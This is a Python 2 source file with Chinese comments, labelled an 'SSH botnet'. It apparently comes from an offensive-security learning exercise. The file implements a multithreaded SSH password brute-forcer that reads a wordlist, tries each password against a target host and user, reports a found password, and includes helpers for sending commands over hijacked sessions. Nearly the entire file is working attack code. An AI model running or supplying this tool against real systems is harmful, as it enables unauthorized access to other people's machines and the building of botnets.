# coding:utf-8
# ssh 僵尸网络
# Pexpect 能够实现程序交互、等待预期的屏幕输出，并据此做出不同的响应

import optparse
import time
import threading
import pexpect
from pexpect import pxssh

maxConnections = 5 # 最大连接数
connection_lock = threading.BoundedSemaphore(value=maxConnections) # 连接锁
isFound = False # 是否找到破解密码
Fails = 0
PROMPT = ['# ', '>>> ', '> ', '\$ ']

# 在通过验证的 SSH 会话中发送命令，等待命令提示符再次出现，并打印结果
def send_command(child, cmd):
  global PROMPT
  child.sendline(cmd)
  child.expect(PROMPT)
  print(child.before)

# 接受参数：用户名、主机名和密码
# 返回 SSH 连接的结果
def connect(user, host, password):
  ssh_newkey = 'Are you sure you want to continue connecting'
  connStr = 'ssh ' + user + '@' + host
  # 创建并控制一个子应用程序，传入控制命令
  child = pexpect.spawn(connStr)
  # 等待子应用程序返回给定的字符串
  # 可能会出现三种输出：超时、表示主机已使用一个新的公钥的信息和要求输入密码的提示
  ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
  # 超时返回0
  if ret == 0:
    print('Error Connecting')
    return
  # 捕获了 ssh_newkey 消息返回1
  if ret == 1:
    child.sendline('yes')
    ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
    if ret == 0:
      print('Error Connecting')
      return
  child.sendline(password)
  child.expect(PROMPT)
  print('Success Connecting')
  return child

def pxssh_send_command(s, cmd):
  s.sendline(cmd)
  s.prompt()
  print(s.before)

def pxssh_connect(host, user, password, release):
  global isFound
  global Fails
  try:
    s = pxssh.pxssh()
    s.login(host, user, password)
    print('Password Found: ' + password)
    isFound = True
  except Exception, e:
    if 'read_nonblocking' in str(e):
      Fails += 1
      time.sleep(5)
      pxssh_connect(host, user, password, False)
    elif 'synchronize with original prompt' in str(e):
      time.sleep(1)
      pxssh_connect(host, user, password, False)
  finally:
    if release: connection_lock.release()

def main():
  global isFound
  global Fails
  parser = optparse.OptionParser('usage prop -H <target host> -u <user> -F <password list>')
  parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
  parser.add_option('-u', dest='user', type='string', help='specify target user')
  parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
  (options, args) = parser.parse_args()
  host = options.tgtHost
  passwdFile = options.passwdFile
  user = options.user
  if host == None or passwdFile == None or user == None:
    print(parser.usage)
    exit(0)
  fn = open(passwdFile, 'r')
  for line in fn.readlines():
    if isFound:
      print('Exiting: Password Found')
      exit(0)
    if Fails > 5:
      print('Exiting: Too Many Socket Timeouts')
      exit(0)
    connection_lock.acquire()
    password = line.strip('\r').strip('\n')
    print('Testing: ' + str(password))
    t = threading.Thread(target=pxssh_connect, args=(host, user, password, True))
    child = t.start()

if __name__ == '__main__':
  main()